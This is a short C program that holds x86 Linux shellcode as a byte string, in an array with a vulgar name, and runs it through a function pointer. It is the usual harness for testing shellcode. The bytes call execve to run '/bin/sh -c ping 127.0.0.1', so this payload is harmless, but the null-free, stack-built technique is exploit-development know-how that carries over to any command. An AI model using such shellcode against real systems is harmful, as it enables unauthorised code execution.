#include<stdio.h>
#include<string.h>

char asshole[] = "\x31\xc0\x6a\x0b\x58\x99\x52\x68\x2e\x31\x20\x20\x68\x2e\x30\x2e\x30\x68\x20\x31\x32\x37\x68\x70\x69\x6e\x67\x89\xe6\x52\x66\x68\x2d\x63\x89\xe1\x52\x68\x2f\x2f\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f\x2f\x62\x89\xe3\x52\x56\x51\x53\x89\xe1\xcd\x80";
		
int main(int argc, char **argv)
{
  int (*func)();
  func = (int (*)()) asshole;
  (int)(*func)();
}

